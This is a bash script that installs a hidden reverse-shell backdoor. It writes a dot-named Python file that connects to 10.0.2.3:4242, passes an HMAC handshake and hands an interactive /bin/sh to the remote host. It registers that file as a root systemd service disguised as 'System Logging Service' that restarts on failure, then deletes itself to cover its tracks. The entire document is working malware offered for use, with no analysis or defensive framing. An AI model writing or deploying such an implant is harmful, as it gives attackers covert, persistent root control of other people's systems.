#!/bin/bash
# --- SETTINGS ---
IP="10.0.2.3"
PORT=4242
NAME="sys-log-update"
# ----------------
TARGET="/usr/local/bin/.$NAME.py"
cat <<EOF > "$TARGET"
import socket,os,subprocess,hmac,hashlib
PSK = str("SuperSecretKey123") 
try:
    s=socket.socket(2,1);s.settimeout(10);s.connect(("$IP",$PORT))
    chal = s.recv(32)
    resp = hmac.new(PSK, chal, hashlib.sha256).digest()
    s.sendall(resp)
    auth_status = s.recv(7) # "AUTH_OK" is 7 bytes
    if auth_status == "AUTH_OK":
        s.settimeout(None)
        [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
        subprocess.call(["/bin/sh","-i"])
    s.close()
except:pass
EOF
cat <<EOF > /etc/systemd/system/$NAME.service
[Unit]
Description=System Logging Service
[Service]
ExecStart=$(which python) $TARGET
Restart=always
RestartSec=5
User=root
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now $NAME
rm -- "$0"